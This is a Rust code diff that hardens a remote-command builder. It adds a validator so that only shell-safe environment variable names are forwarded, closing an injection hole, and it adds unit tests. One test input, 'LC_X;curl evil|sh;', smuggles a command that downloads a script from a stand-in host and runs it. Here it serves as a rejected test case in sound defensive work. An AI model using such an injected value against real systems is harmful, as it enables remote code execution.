@@ -81,10 +81,24 @@ pub fn remote_command(
     cmd
 }
 
-/// LANG plus every LC_* variable from the local environment.
+/// True for an env-var name safe to splice into a POSIX-sh assignment: only
+/// `[A-Za-z_][A-Za-z0-9_]*`. Anything else (the kernel permits arbitrary
+/// bytes except `=`/NUL in names) would break — or inject into — the remote
+/// command string, since the name is emitted unquoted. github #6.
+fn is_shell_safe_name(name: &str) -> bool {
+    let mut chars = name.chars();
+    match chars.next() {
+        Some(c) if c.is_ascii_alphabetic() || c == '_' => {}
+        _ => return false,
+    }
+    chars.all(|c| c.is_ascii_alphanumeric() || c == '_')
+}
+
+/// LANG plus every LC_* variable from the local environment, restricted to
+/// names that are safe to emit as shell assignments.
 fn local_locale_vars() -> Vec<(String, String)> {
     std::env::vars()
-        .filter(|(k, _)| k == "LANG" || k.starts_with("LC_"))
+        .filter(|(k, _)| (k == "LANG" || k.starts_with("LC_")) && is_shell_safe_name(k))
         .collect()
 }
 
@@ -173,6 +187,17 @@ mod tests {
     fn shell_quote_escapes_single_quotes() {
         assert_eq!(shell_quote("plain"), "'plain'");
         assert_eq!(shell_quote("it's"), "'it'\\''s'");
+    }
+
+    #[test]
+    fn only_well_formed_env_names_are_forwarded() {
+        assert!(is_shell_safe_name("LANG"));
+        assert!(is_shell_safe_name("LC_CTYPE"));
+        assert!(is_shell_safe_name("_x9"));
+        assert!(!is_shell_safe_name("")); // empty
+        assert!(!is_shell_safe_name("9LC")); // leading digit
+        assert!(!is_shell_safe_name("LC_X;curl evil|sh;")); // metacharacters
+        assert!(!is_shell_safe_name("LC X")); // space
     }
 
     #[test]
